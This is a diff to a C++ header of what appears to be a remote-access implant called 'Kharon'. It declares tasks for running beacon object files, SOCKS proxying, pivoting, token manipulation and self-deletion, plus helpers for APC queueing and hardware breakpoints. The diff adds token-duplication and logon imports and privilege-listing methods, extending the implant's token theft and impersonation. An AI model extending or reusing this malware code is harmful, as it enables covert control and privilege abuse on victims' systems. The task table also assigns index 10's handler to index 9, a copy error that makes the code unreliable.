@@ -833,6 +833,8 @@ namespace Root {
             DECLAPI( OpenProcessToken );
             DECLAPI( OpenThreadToken );
             DECLAPI( GetTokenInformation );
+            DECLAPI( DuplicateTokenEx );
+            DECLAPI( LogonUserA );
 
             DECLAPI( GetUserNameA );
 
@@ -856,6 +858,8 @@ namespace Root {
             RSL_TYPE( OpenProcessToken ),
             RSL_TYPE( OpenThreadToken ),
             RSL_TYPE( GetTokenInformation ),
+            RSL_TYPE( DuplicateTokenEx ),
+            RSL_TYPE( LogonUserA ),
 
             RSL_TYPE( GetUserNameA ),
 
@@ -2006,17 +2010,17 @@ public:
         ULONG        ID;
         ERROR_CODE ( Task::*Run )( JOBS* );
     } Mgmt[TSK_LENGTH] = {
-        Mgmt[0].ID  = TskExit,       Mgmt[0].Run = &Task::Exit,
-        Mgmt[1].ID  = TskFileSystem, Mgmt[1].Run = &Task::FileSystem,
-        Mgmt[2].ID  = TskProcess,    Mgmt[2].Run = &Task::Process,
-        Mgmt[3].ID  = TskExecBof,    Mgmt[3].Run = &Task::ExecBof,
-        Mgmt[4].ID  = TskConfig,     Mgmt[4].Run = &Task::Config,
-        Mgmt[5].ID  = TskDownload,   Mgmt[5].Run = &Task::Download,
-        Mgmt[6].ID  = TskUpload,     Mgmt[6].Run = &Task::Upload,
-        Mgmt[7].ID  = TskSocks,      Mgmt[7].Run = &Task::Socks,
-        Mgmt[8].ID  = TskToken,      Mgmt[8].Run = &Task::Token,
-        Mgmt[9].ID  = TskPivot,      Mgmt[9].Run = &Task::Pivot,
-        Mgmt[10].ID = TskSelfDelete, Mgmt[9].Run = &Task::SelfDel
+        Mgmt[0].ID  = Enm::Task::Exit,       Mgmt[0].Run = &Task::Exit,
+        Mgmt[1].ID  = Enm::Task::FileSystem, Mgmt[1].Run = &Task::FileSystem,
+        Mgmt[2].ID  = Enm::Task::Process,    Mgmt[2].Run = &Task::Process,
+        Mgmt[3].ID  = Enm::Task::ExecBof,    Mgmt[3].Run = &Task::ExecBof,
+        Mgmt[4].ID  = Enm::Task::Config,     Mgmt[4].Run = &Task::Config,
+        Mgmt[5].ID  = Enm::Task::Download,   Mgmt[5].Run = &Task::Download,
+        Mgmt[6].ID  = Enm::Task::Upload,     Mgmt[6].Run = &Task::Upload,
+        Mgmt[7].ID  = Enm::Task::Socks,      Mgmt[7].Run = &Task::Socks,
+        Mgmt[8].ID  = Enm::Task::Token,      Mgmt[8].Run = &Task::Token,
+        Mgmt[9].ID  = Enm::Task::Pivot,      Mgmt[9].Run = &Task::Pivot,
+        Mgmt[10].ID = Enm::Task::SelfDelete, Mgmt[9].Run = &Task::SelfDel
     };
 };
 
@@ -2095,7 +2099,7 @@ public:
     ) -> ULONG;
 
     auto Rnd( VOID ) -> ULONG {
-        return Enum( TdRandom, 0 );
+        return Enum( Enm::Thread::Random, 0 );
     };
 
     auto Target( 
@@ -2103,7 +2107,7 @@ public:
         _Out_opt_ ULONG ThreadQtt,
         _Out_opt_ PSYSTEM_THREAD_INFORMATION ThreadInfo
     ) -> ULONG {
-        return Enum( TdTarget, ProcessID, ThreadQtt, ThreadInfo );
+        return Enum( Enm::Thread::Target, ProcessID, ThreadQtt, ThreadInfo );
     }
 
     auto QueueAPC(
@@ -2115,7 +2119,7 @@ public:
     ) -> LONG;
 
     auto InstallHwbp( VOID ) {
-        return Enum( TdHwbp );
+        return Enum( Enm::Thread::Hwbp );
     }
 };
 
@@ -2146,6 +2150,12 @@ typedef struct _TOKEN_NODE {
     struct _TOKEN_NODE* Next;
 } TOKEN_NODE; 
 
+struct _PRIV_LIST {
+    ULONG Attributes;
+    CHAR* PrivName;
+};
+typedef _PRIV_LIST PRIV_LIST;
+
 class Token {
 private:
     Root::Kharon* Self;
@@ -2160,6 +2170,20 @@ public:
     auto GetByID(
         _In_ ULONG TokenID
     ) -> HANDLE;
+
+    auto GetPrivs(
+        _In_ HANDLE TokenHandle
+    ) -> BOOL;
+
+    auto ListPrivs(
+        _In_  HANDLE  TokenHandle,
+        _Out_ ULONG  &ListCount
+    ) -> PVOID;
+
+    auto Add(
+        _In_ HANDLE TokenHandle,
+        _In_ ULONG  ProcessID
+    ) -> TOKEN_NODE*;
 
     auto Rm(
         _In_ ULONG TokenID
